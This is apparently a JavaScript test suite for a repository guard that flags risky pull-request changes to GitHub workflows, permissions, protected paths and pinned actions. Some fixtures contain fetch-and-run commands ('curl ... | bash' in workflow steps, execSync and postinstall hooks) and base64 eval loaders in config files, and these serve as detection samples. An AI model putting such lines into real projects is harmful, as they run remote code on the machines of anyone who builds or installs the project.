const assert = require("assert");
const {
  detectStructuralFindings,
  findUnpinnedActions,
  introducesOidcWritePermission,
  introducesWritePermissions,
  patchIntroducesOidcWritePermission,
} = require("../src/structural");

const findings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/ci.yml",
      patch: [
        "@@",
        "+on:",
        "+  pull_request_target:",
        "+permissions: write-all",
        "+id-token: write",
      ].join("\n"),
    },
    {
      filename: "src/app.js",
      patch: "+console.log('safe')",
    },
  ],
});

assert(findings.find((finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED"));
assert(findings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));
assert(findings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION"));

const noFindings = detectStructuralFindings({
  files: [{ filename: "src/app.js", patch: "+console.log('safe')" }],
});

assert.equal(noFindings.length, 0);

const inlineFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/inline.yml",
      patch: [
        "@@",
        "+on: [pull_request, pull_request_target]",
        "+permissions: { contents: write, id-token: write, pull-requests: write }",
      ].join("\n"),
    },
  ],
});

assert(inlineFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));
assert(inlineFindings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION"));

const inlineNonWriteFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/inline-read.yml",
      patch: "+permissions: { contents: read, id-token: write-token }",
    },
  ],
});
assert(
  !inlineNonWriteFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const inlineObjectFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/inline-object.yml",
      patch: "+on: { pull_request_target: {} }",
    },
  ],
});

assert(inlineObjectFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));

const scalarTriggerFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/scalar.yml",
      patch: "+on: pull_request_target # elevated trigger",
    },
  ],
});
assert(scalarTriggerFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));

const quotedTriggerFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/quoted.yml",
      patch: [
        '+"on": "pull_request_target"',
        "+'pull_request_target':",
      ].join("\n"),
    },
  ],
});
assert(quotedTriggerFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));

const nonCorePermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/packages.yml",
      patch: [
        "@@",
        "+permissions:",
        "+  packages: write",
        "+  deployments: write",
      ].join("\n"),
    },
  ],
});
assert(
  nonCorePermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const actionInputWriteFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/input-mode.yml",
      patch: [
        "@@",
        "+jobs:",
        "+  build:",
        "+    steps:",
        "+      - uses: example/action@v1",
        "+        with:",
        "+          mode: write",
      ].join("\n"),
    },
  ],
});
assert(
  !actionInputWriteFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const actionInputPermissionNameFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/input-contents.yml",
      patch: [
        "@@",
        "+jobs:",
        "+  build:",
        "+    steps:",
        "+      - uses: example/action@v1",
        "+        with:",
        "+          contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  !actionInputPermissionNameFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const envPermissionNameFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/env-contents.yml",
      patch: [
        "@@",
        "+env:",
        "+  contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  !envPermissionNameFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const contextPermissionBlockFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/existing-permissions.yml",
      patch: [
        "@@",
        " permissions:",
        "-  contents: read",
        "+  contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  contextPermissionBlockFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const missingHeaderPermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/existing-large-permissions.yml",
      patch: [
        "@@",
        "   statuses: read",
        "+  id-token: write",
      ].join("\n"),
    },
  ],
});
assert(
  missingHeaderPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
  ),
);
assert(
  !missingHeaderPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const quotedPermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/quoted-permissions.yml",
      patch: [
        "@@",
        "+\"permissions\": \"write-all\"",
        "+permissions:",
        "+  \"contents\": \"write\"",
        "+'permissions': { 'pull-requests': 'write' }",
      ].join("\n"),
    },
  ],
});
assert(
  quotedPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const oidcOnlyPermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/aport-guard.yml",
      patch: [
        "@@",
        "+permissions:",
        "+  id-token: write",
        "+  contents: read",
        "+  pull-requests: read",
      ].join("\n"),
    },
  ],
});
assert(
  oidcOnlyPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
  ),
);
assert(
  !oidcOnlyPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const oidcInlinePermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/oidc-inline.yml",
      patch: "+permissions: { contents: read, id-token: write }",
    },
  ],
});
assert(
  oidcInlinePermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
  ),
);
assert(
  !oidcInlinePermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const workflowTemplateFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflow-templates/release.yml",
      patch: [
        "@@",
        "+on: pull_request_target",
        "+permissions:",
        "+  contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  workflowTemplateFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  workflowTemplateFindings.find(
    (finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED",
  ),
);
assert(
  workflowTemplateFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const renamedProtectedFindings = detectStructuralFindings({
  files: [
    {
      filename: "src/moved-ci.yml",
      previous_filename: ".github/workflows/ci.yml",
      patch: "+name: moved",
    },
  ],
});
const renamedProtectedFinding = renamedProtectedFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(renamedProtectedFinding);
assert(renamedProtectedFinding.paths.includes(".github/workflows/ci.yml"));

const missingPatchFindings = detectStructuralFindings({
  files: [{ filename: ".github/workflows/large.yml" }],
});
assert(missingPatchFindings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_DIFF_UNAVAILABLE"));

const contentFallbackFindings = detectStructuralFindings({
  files: [{ filename: ".github/workflows/full.yml" }],
  fileContents: {
    ".github/workflows/full.yml": [
      "on:",
      "  pull_request_target:",
      "permissions: write-all",
    ].join("\n"),
  },
});
assert(contentFallbackFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));
assert(contentFallbackFindings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION"));

const protectedObfuscationFindings = detectStructuralFindings({
  files: [
    {
      filename: "next.config.js",
      patch: [
        "@@",
        "+global.o = '5-3-" + "132-du';",
        "+module.exports = {};",
      ].join("\n"),
    },
  ],
});
const protectedObfuscationFinding = protectedObfuscationFindings.find(
  (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
);
assert(protectedObfuscationFinding);
assert.equal(protectedObfuscationFinding.severity, "high");
assert(protectedObfuscationFinding.paths.includes("next.config.js"));

const protectedEvalFindings = detectStructuralFindings({
  files: [
    {
      filename: "web/tailwind.config.js",
      patch:
        "+module.exports = ev" +
        "al(Buffer.from('ZXhwb3J0IGRlZmF1bHQge30=', 'base64').toString())",
    },
  ],
});
assert(
  protectedEvalFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const protectedRemoteShellFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/build.yml",
      patch:
        "+run: curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash",
    },
  ],
});
assert(
  protectedRemoteShellFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const protectedRemoteShellInScriptFindings = detectStructuralFindings({
  files: [
    {
      filename: "scripts/install.js",
      patch:
        "+execSync('curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash')",
    },
  ],
});
assert(
  protectedRemoteShellInScriptFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const customProtectedSourceObfuscationFindings = detectStructuralFindings({
  protectedPaths: ["src/**"],
  files: [
    {
      filename: "src/index.js",
      patch:
        "+module.exports = Fun" +
        "ction(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString())",
    },
  ],
});
assert(
  customProtectedSourceObfuscationFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const missingCustomProtectedSourcePatchFindings = detectStructuralFindings({
  protectedPaths: ["src/**"],
  files: [{ filename: "src/index.js" }],
});
assert(
  missingCustomProtectedSourcePatchFindings.find(
    (finding) =>
      finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
  ),
);

const deletionOnlyCustomProtectedPatchFindings = detectStructuralFindings({
  protectedPaths: ["src/**"],
  files: [
    {
      filename: "src/legacy.js",
      status: "removed",
      patch: [
        "@@ -1,2 +0,0 @@",
        "-const legacy = true;",
        "-module.exports = legacy;",
      ].join("\n"),
    },
  ],
});
assert(
  deletionOnlyCustomProtectedPatchFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !deletionOnlyCustomProtectedPatchFindings.find(
    (finding) =>
      finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
  ),
);

const benignProtectedConfigFindings = detectStructuralFindings({
  files: [
    {
      filename: "web/next.config.js",
      patch: "+module.exports = { poweredByHeader: false };",
    },
  ],
});
assert(
  benignProtectedConfigFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !benignProtectedConfigFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);
const benignProtectedConfigFinding = benignProtectedConfigFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert.equal(benignProtectedConfigFinding.severity, "warning");

const guardWorkflowFindings = detectStructuralFindings({
  blockProtectedPaths: false,
  files: [
    {
      filename: ".github/workflows/aport-guard.yml",
      patch: "+          block-protected-paths: false",
    },
  ],
});
const guardWorkflowFinding = guardWorkflowFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(guardWorkflowFinding);
assert.equal(guardWorkflowFinding.severity, "high");

const repositoryPolicyConfigFindings = detectStructuralFindings({
  blockProtectedPaths: false,
  files: [
    {
      filename: ".aport/policy.yaml",
      patch: "+github:\n+  block_protected_paths: false",
    },
  ],
});
const repositoryPolicyConfigFinding = repositoryPolicyConfigFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(repositoryPolicyConfigFinding);
assert.equal(repositoryPolicyConfigFinding.severity, "high");

const omittedWorkflowProtectedPathsFindings = detectStructuralFindings({
  blockProtectedPaths: false,
  protectedPaths: ["src/**"],
  files: [
    {
      filename: ".github/workflows/aport-guard.yml",
      patch: "+          uses: attacker/action@v1",
    },
  ],
});
const omittedWorkflowProtectedPathsFinding =
  omittedWorkflowProtectedPathsFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  );
assert(omittedWorkflowProtectedPathsFinding);
assert.equal(omittedWorkflowProtectedPathsFinding.severity, "high");

const consumerAppPathFindings = detectStructuralFindings({
  blockProtectedPaths: false,
  protectedPaths: ["src/**"],
  files: [
    {
      filename: "functions/api/github/webhook.js",
      patch: "+export function handler() { return Response.json({ ok: true }); }",
    },
  ],
});
assert(
  !consumerAppPathFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);

const blockingProtectedConfigFindings = detectStructuralFindings({
  blockProtectedPaths: true,
  files: [
    {
      filename: "web/next.config.js",
      patch: "+module.exports = { poweredByHeader: false };",
    },
  ],
});
const blockingProtectedConfigFinding = blockingProtectedConfigFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(blockingProtectedConfigFinding);
assert.equal(blockingProtectedConfigFinding.severity, "high");

const protectedDocsFindings = detectStructuralFindings({
  files: [
    {
      filename: "policies/system.command.execute.v1/README.md",
      patch:
        "+Example only: exec('curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash')",
    },
  ],
});
assert(
  protectedDocsFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !protectedDocsFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const missingSensitivePatchFindings = detectStructuralFindings({
  files: [{ filename: "web/next.config.js" }],
});
const missingSensitivePatchFinding = missingSensitivePatchFindings.find(
  (finding) => finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
);
assert(missingSensitivePatchFinding);
assert.equal(missingSensitivePatchFinding.severity, "high");
assert(missingSensitivePatchFinding.paths.includes("web/next.config.js"));

const missingLockfilePatchFindings = detectStructuralFindings({
  files: [{ filename: "web/pnpm-lock.yaml" }],
});
assert(
  missingLockfilePatchFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !missingLockfilePatchFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
  ),
);

const lockfilePayloadFindings = detectStructuralFindings({
  files: [
    {
      filename: "package-lock.json",
      patch:
        "+\"postinstall\": \"curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash\"",
    },
  ],
});
assert(
  lockfilePayloadFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const policyFindings = detectStructuralFindings({
  files: [{ filename: ".aport/policy.yaml", patch: "+version: oap-github-policy/1" }],
});
assert(policyFindings.find((finding) => finding.code === "OAP.GH.POLICY_HEAD_UNTRUSTED"));

const pinnedFindings = detectStructuralFindings({
  requirePinnedActions: true,
  files: [
    {
      filename: ".github/workflows/pin.yml",
      patch: [
        "@@",
        "+steps:",
        "+  - uses: actions/checkout@v4",
        "+  - uses: aporthq/policy-verify-action@0123456789abcdef0123456789abcdef01234567",
      ].join("\n"),
    },
  ],
});
const unpinnedFinding = pinnedFindings.find((finding) => finding.code === "OAP.REPO.UNPINNED_ACTION");
assert(unpinnedFinding);
assert.deepEqual(unpinnedFinding.actions, ["actions/checkout@v4"]);

const commentedUsesFindings = detectStructuralFindings({
  requirePinnedActions: true,
  files: [
    {
      filename: ".github/workflows/commented-uses.yml",
      patch: "+  - uses: actions/setup-node@v4 # install node",
    },
  ],
});
const commentedUsesFinding = commentedUsesFindings.find(
  (finding) => finding.code === "OAP.REPO.UNPINNED_ACTION",
);
assert(commentedUsesFinding);
assert.deepEqual(commentedUsesFinding.actions, ["actions/setup-node@v4"]);

const truncatedFindings = detectStructuralFindings({
  evidenceTruncated: { files: true, commits: false, maxPages: 20 },
});
const truncatedFinding = truncatedFindings.find(
  (finding) => finding.code === "OAP.REPO.EVIDENCE_TRUNCATED",
);
assert(truncatedFinding);
assert.equal(truncatedFinding.severity, "high");

assert.deepEqual(findUnpinnedActions("+uses: ./local/action\n+uses: docker://alpine:3"), []);
assert.equal(introducesWritePermissions("permissions:\n  id-token: write"), false);
assert.equal(introducesOidcWritePermission("permissions:\n  id-token: write"), true);
assert.equal(
  patchIntroducesOidcWritePermission("@@\n permissions:\n+  id-token: write"),
  true,
);
assert.equal(introducesWritePermissions("permissions:\n  contents: write"), true);

// --- bootstrap install -------------------------------------------------
// The first-install PR adds the guard workflow. Control-plane paths are
// fail-closed, so without the bootstrap case every new adopter's first PR goes
// red on the file it is installing, which teaches people to remove the check.
// Reported, not blocked, and only when nothing is being weakened.
const GUARD_WF = ".github/workflows/aport-guard.yml";
// A real install carries a `uses:` STEP naming this action. A raw line match is
// not enough: `run: |` block scalars can contain the same text.
const GUARD_USES = "+      - uses: aporthq/policy-verify-action@v1";
const guardInstallPatch = (...extra) =>
  ["@@", "+name: APort Repository Guard", "+on: [pull_request]", "+jobs:",
   "+  aport:", "+    steps:", GUARD_USES, ...extra].join("\n");
// The carve-out only applies to pull-request validation, so every install
// fixture has to say which event it is. Push stays fail-closed.
const onPullRequest = (options) =>
  detectStructuralFindings({ eventName: "pull_request", ...options });
const blockingCodes = (findings) =>
  findings
    .filter((f) => ["high", "error"].includes(String(f.severity).toLowerCase()))
    .map((f) => f.code);

const bootstrapFindings = onPullRequest({
  files: [
    {
      filename: GUARD_WF,
      status: "added",
      patch: guardInstallPatch("+permissions:", "+  contents: read"),
    },
  ],
});
const bootstrapFinding = bootstrapFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(bootstrapFinding);
assert.equal(bootstrapFinding.severity, "warning");
assert.equal(bootstrapFinding.details.bootstrap_install, true);
assert.deepEqual(blockingCodes(bootstrapFindings), []);

// Installing the guard alongside ordinary source changes is still an install.
assert.deepEqual(
  blockingCodes(
    onPullRequest({
      files: [
        { filename: GUARD_WF, status: "added", patch: guardInstallPatch() },
        { filename: "src/app.ts", status: "modified", patch: "@@\n+const x = 1;\n" },
      ],
    }),
  ),
  [],
);

// block-protected-paths: true is an explicit opt-in to fail closed, so it wins.
assert.equal(
  onPullRequest({
    files: [{ filename: GUARD_WF, status: "added", patch: guardInstallPatch() }],
    blockProtectedPaths: true,
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "high",
);

// Everything that can actually weaken the guard must still block.
for (const [label, files] of [
  ["modifying an existing workflow", [
    { filename: GUARD_WF, status: "modified", patch: "@@\n-  contents: read\n+permissions: write-all\n" }]],
  ["deleting the guard workflow", [
    { filename: GUARD_WF, status: "removed", patch: "" }]],
  ["adding a workflow with write-all", [
    { filename: ".github/workflows/evil.yml", status: "added", patch: "@@\n+permissions: write-all\n" }]],
  ["adding pull_request_target", [
    { filename: ".github/workflows/evil.yml", status: "added",
      patch: "@@\n+on: [pull_request_target]\n+permissions:\n+  contents: write\n" }]],
  ["installing while modifying another workflow", [
    { filename: GUARD_WF, status: "added", patch: guardInstallPatch() },
    { filename: ".github/workflows/ci.yml", status: "modified", patch: "@@\n+  foo: bar\n" }]],
  ["weakening an existing policy file", [
    { filename: ".aport/policy.yaml", status: "modified", patch: "@@\n-strict: true\n+strict: false\n" }]],
]) {
  assert(
    blockingCodes(onPullRequest({ files })).length > 0,
    `${label} must still fail closed`,
  );
}

// Only an actual guard install gets the carve-out. Adding an unrelated
// workflow, a local composite action or a brand-new policy file is still a
// control-plane change and stays fail-closed, even though every file is new.
for (const [label, files] of [
  ["an unrelated workflow", [
    { filename: ".github/workflows/deploy.yml", status: "added",
      patch: "@@\n+name: Deploy\n+on: [push]\n+jobs:\n+  deploy:\n+    steps:\n+      - run: ./deploy.sh\n" }]],
  ["an unrelated composite action", [
    { filename: ".github/actions/deploy/action.yml", status: "added",
      patch: "@@\n+name: Deploy\n+runs:\n+  using: composite\n" }]],
  ["a brand-new policy file", [
    { filename: ".aport/policy.yaml", status: "added",
      patch: "@@\n+version: oap-github-policy/1\n" }]],
  ["a workflow naming a lookalike action", [
    { filename: ".github/workflows/evil.yml", status: "added",
      patch: "@@\n+jobs:\n+  x:\n+    steps:\n+      - uses: evil/policy-verify-action@v1\n" }]],
]) {
  const finding = onPullRequest({ files }).find(
    (f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  );
  assert.equal(finding.severity, "high", `adding ${label} must not read as an install`);
  assert.equal(finding.details, undefined, `adding ${label} must not be marked bootstrap`);
}

// A repository that requires pinning has asked for pinning to be enforced.
// OAP.REPO.UNPINNED_ACTION is only warning-level, so downgrading the
// protected-path finding too would leave the install PR with nothing blocking
// and the required check would never fail. The unpinned install stays blocking.
const unpinnedInstall = onPullRequest({
  requirePinnedActions: true,
  files: [
    { filename: GUARD_WF, status: "added",
      patch: guardInstallPatch("+      - uses: actions/checkout@v4") },
  ],
});
const unpinnedInstallFinding = unpinnedInstall.find(
  (f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert.equal(unpinnedInstallFinding.severity, "high");
assert.equal(unpinnedInstallFinding.details, undefined);
assert(blockingCodes(unpinnedInstall).includes("OAP.REPO.PROTECTED_PATH_TOUCHED"));
assert(unpinnedInstall.find((f) => f.code === "OAP.REPO.UNPINNED_ACTION"));

// Pinning every action in the same install restores the carve-out, so the fix
// is to pin rather than to drop the guard.
const pinnedInstall = onPullRequest({
  requirePinnedActions: true,
  files: [
    { filename: GUARD_WF, status: "added",
      patch: [
        "@@", "+jobs:", "+  aport:", "+    steps:",
        "+      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567",
        "+      - uses: aporthq/policy-verify-action@0123456789abcdef0123456789abcdef01234567",
      ].join("\n") },
  ],
});
assert.equal(
  pinnedInstall.find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "warning",
);
assert.deepEqual(blockingCodes(pinnedInstall), []);

// When the repository does not require pinning, an unpinned install is still a
// bootstrap: nothing has asked for pins, so there is no check to keep blocking.
assert.equal(
  onPullRequest({
    files: [
      { filename: GUARD_WF, status: "added",
        patch: guardInstallPatch("+      - uses: actions/checkout@v4") },
    ],
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "warning",
);

// The marker may arrive as full file content when GitHub omits the patch.
assert.equal(
  onPullRequest({
    files: [{ filename: GUARD_WF, status: "added" }],
    fileContents: {
      [GUARD_WF]: "jobs:\n  aport:\n    steps:\n      - uses: aporthq/policy-verify-action@v1\n",
    },
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "warning",
);

// An install that also adds an unrelated control-plane file is not a plain
// install. Requiring only SOME control-plane file to be guard-related would
// hand the unrelated file the downgrade too.
for (const [label, extra] of [
  ["an unrelated new workflow", {
    filename: ".github/workflows/deploy.yml", status: "added",
    patch: "@@\n+name: Deploy\n+on: [push]\n+jobs:\n+  d:\n+    steps:\n+      - run: ./deploy.sh\n" }],
  ["an unrelated new composite action", {
    filename: ".github/actions/deploy/action.yml", status: "added",
    patch: "@@\n+name: Deploy\n+runs:\n+  using: composite\n" }],
]) {
  const findings = onPullRequest({
    files: [
      { filename: GUARD_WF, status: "added", patch: guardInstallPatch() },
      extra,
    ],
  });
  const finding = findings.find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED");
  assert.equal(finding.severity, "high", `installing alongside ${label} must fail closed`);
  assert.equal(finding.details, undefined, `${label} must not be marked bootstrap`);
}

// The guard marker has to be a real workflow step. `run: |` opens a block
// scalar whose body is literal text, so a heredoc quoting the `uses:` line is
// not an install and must not buy the carve-out.
for (const [label, body] of [
  ["a run heredoc", [
    "+      - run: |", "+          cat <<EOF",
    "+          uses: aporthq/policy-verify-action@v1", "+          EOF"]],
  ["a folded block scalar", [
    "+      - run: >", "+          echo uses: aporthq/policy-verify-action@v1"]],
  ["a non-step script key", [
    "+      - name: Setup", "+        script: |",
    "+          uses: aporthq/policy-verify-action@v1"]],
]) {
  const finding = onPullRequest({
    files: [
      { filename: ".github/workflows/evil.yml", status: "added",
        patch: ["@@", "+name: Evil", "+on: [push]", "+jobs:", "+  x:", "+    steps:",
                ...body].join("\n") },
    ],
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED");
  assert.equal(finding.severity, "high", `${label} must not read as an install`);
  assert.equal(finding.details, undefined, `${label} must not be marked bootstrap`);
}

// Reusable workflows and quoted `uses` keys are executable too. They must be
// parsed into the same allowlist instead of silently ignored while the guard
// step buys the install carve-out.
for (const [label, body] of [
  ["a job-level reusable workflow", [
    "+jobs:", "+  aport:", "+    steps:",
    "+      - uses: aporthq/policy-verify-action@v1",
    "+  reusable:", "+    uses: evil/reusable/.github/workflows/deploy.yml@v1"]],
  ["a quoted non-allowlisted step key", [
    "+jobs:", "+  aport:", "+    steps:",
    "+      - uses: aporthq/policy-verify-action@v1",
    "+      - \"uses\": evil/action@v1"]],
]) {
  const finding = onPullRequest({
    files: [
      { filename: ".github/workflows/aport-guard.yml", status: "added",
        patch: ["@@", "+name: Install", "+on: [pull_request]", ...body].join("\n") },
    ],
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED");
  assert.equal(finding.severity, "high", `${label} must not read as bootstrap`);
  assert.equal(finding.details, undefined, `${label} must not be marked bootstrap`);
}

// A named step that carries `uses:` as a later key of the same step mapping is
// a genuine install, matching how the shipped guard workflow is written.
assert.equal(
  onPullRequest({
    files: [
      { filename: GUARD_WF, status: "added",
        patch: ["@@", "+jobs:", "+  aport:", "+    steps:",
                "+      - name: APort Repository Guard",
                "+        uses: aporthq/policy-verify-action@v1"].join("\n") },
    ],
  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
  "warning",
);

// The carve-out is for the installing pull request. A direct push to a
// protected branch is the case the control-plane rule is fail-closed for, so
// the same files must stay high on push, and when no event is supplied at all.
const installFiles = [
  { filename: GUARD_WF, status: "added", patch: guardInstallPatch() },
];
for (const eventName of ["push", "", undefined, "schedule", "workflow_dispatch"]) {
  const finding = detectStructuralFindings({ files: installFiles, eventName }).find(
    (f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  );
  assert.equal(finding.severity, "high", `event ${eventName} must not be downgraded`);
  assert.equal(finding.details, undefined, `event ${eventName} must not be marked bootstrap`);
}

// Merge-queue re-validation sees the same pull request content, so it keeps the
// downgrade. Otherwise an install that passed on the PR would fail on merge.
for (const eventName of ["pull_request", "pull_request_review", "merge_group"]) {
  assert.equal(
    detectStructuralFindings({ files: installFiles, eventName }).find(
      (f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
    ).severity,
    "warning",
    `event ${eventName} must keep the install carve-out`,
  );
}

console.log("OK structural.test.js");
